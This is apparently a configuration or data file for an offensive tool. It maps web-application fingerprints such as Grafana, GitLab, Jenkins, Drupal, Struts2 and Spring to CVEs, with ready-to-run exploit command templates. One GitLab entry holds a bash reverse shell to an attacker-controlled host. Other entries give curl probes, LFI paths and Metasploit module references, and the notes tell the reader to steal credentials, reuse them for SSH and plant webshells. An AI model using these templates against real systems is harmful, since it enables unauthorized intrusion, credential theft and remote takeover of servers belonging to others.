_comment: Web-application version -> CVE knowledge base with guided (confirm-gated) exploitation hints. match: lowercased tokens that must all appear in the fingerprint (product/name/banner/notes). range: optional cve.satisfies() spec; empty means version-agnostic lead (verify the version). exploit: a ready command template with {TARGET}/{PORT} placeholders. note: what it does / what to grab.

entries.name: Grafana plugin path traversal (arbitrary file read)
entries.note: Unauthenticated arbitrary file read. Grab /etc/passwd, then /etc/grafana/grafana.ini and /var/lib/grafana/grafana.db for admin hashes/data-source creds.

entries.name: GitLab unauthenticated RCE (ExifTool DjVu)
entries.exploit:
# clone a public PoC (e.g. gitlab_exif RCE) and point it at the target
# python3 gitlab_rce.py {TARGET} {PORT} 'bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"'
entries.note: Pre-auth RCE via image upload -> ExifTool. Use a maintained PoC; register a throwaway account first if uploads need auth.

entries.name: Atlassian Confluence OGNL injection RCE
entries.note: Unauthenticated OGNL injection; command output returns in the X-Cmd response header. Verify the exact version-affected range before relying on it.

entries.name: Jenkins CLI arbitrary file read
entries.note: Arbitrary file read via the CLI '@' arg expansion. Read /etc/passwd, then Jenkins secrets (secret.key, master.key, credentials.xml) to decrypt stored creds.

entries.name: Joomla unauthenticated information disclosure
entries.note: Leaks the Joomla config including DB user/password over the REST API. Reuse the DB creds for SSH/CMS admin.

entries.name: Drupalgeddon2 unauthenticated RCE
entries.exploit:
# use a maintained drupalgeddon2 PoC against http://{TARGET}:{PORT}/
# python3 drupalgeddon2.py http://{TARGET}:{PORT}/
entries.note: Pre-auth RCE via form-API render array (Drupal 7 <7.58 / 8 <8.5.1). Confirm the Drupal major version first.

entries.name: Apache Tomcat AJP file read/inclusion (Ghostcat)
entries.exploit:
# needs the AJP connector (usually 8009) reachable
# python3 ghostcat.py -p 8009 {TARGET}  # read WEB-INF/web.xml, then chase deployable JSP for RCE
entries.note: AJP (8009) file read/inclusion; can become RCE if you can upload a JSP the app then includes.

entries.name: Cacti unauthenticated command injection
entries.note: Unauth command injection via remote_agent.php (needs a guessable/allowed host). Swap ';id' for a reverse shell one-liner once confirmed.

entries.name: Webmin password_change RCE
entries.exploit:
# Metasploit: use exploit/linux/http/webmin_backdoor  (or a curl PoC against /password_change.cgi)
# RHOSTS {TARGET}; RPORT {PORT}
entries.note: Unauthenticated RCE via the password_change.cgi backdoor when password expiry is enabled.

entries.name: Metabase pre-auth RCE (setup-token JDBC)
entries.exploit: curl -s 'http://{TARGET}:{PORT}/api/session/properties' | grep -o 'setup-token[^,]*'   # then abuse /api/setup/validate with an H2 JDBC payload
entries.note: Leak the setup-token, then RCE via a crafted H2 JDBC connection string in /api/setup/validate.

entries.name: ownCloud graphapi phpinfo secret disclosure
entries.note: Leaks environment (incl. admin credentials / object-store keys) via a bundled phpinfo. Affects owncloud/graphapi 0.2.x-0.3.0.

entries.name: Apache Struts2 OGNL RCE (Content-Type)
entries.exploit: # use a maintained Struts2 (S2-045) PoC against http://{TARGET}:{PORT}/  -- injects OGNL via the Content-Type header
entries.note: Classic pre-auth RCE via a malicious Content-Type. Confirm a Struts2 action endpoint (.action/.do) first.

entries.name: phpMyAdmin LFI / SQL-shell to RCE
entries.exploit:
# with valid DB creds, log in then: /index.php?target=db_sql.php%253f/../../../../etc/passwd  (LFI)
# or write a webshell via SELECT ... INTO OUTFILE if FILE priv is granted
entries.note: phpMyAdmin 4.8.x LFI via the target param; combine with SQL SELECT INTO OUTFILE for a webshell once authenticated.

entries.name: Nagios XI authenticated RCE
entries.note: Post-auth RCE (default creds nagiosadmin often work). Enumerate the exact Nagios XI build to pick the right CVE.

entries.name: Nginx UI (0xJacky) unauthenticated abuse
entries.exploit: curl -s 'http://{TARGET}:{PORT}/api/settings'   # probe unauth API; check /api/backup and config test-run RCE paths
entries.note: 0xJacky/nginx-ui manager exposes powerful config/test/run endpoints. Probe the API unauth (backup disclosure / config-run RCE); a known-vulnerable admin panel is a strong foothold.

entries.name: Spring4Shell RCE (data binding)
entries.exploit: # use a maintained Spring4Shell PoC against http://{TARGET}:{PORT}/  -- writes a JSP webshell via classloader data binding
entries.note: RCE on Spring MVC apps running on Tomcat with JDK9+. Confirm a data-binding endpoint; drops a JSP shell under the webroot.
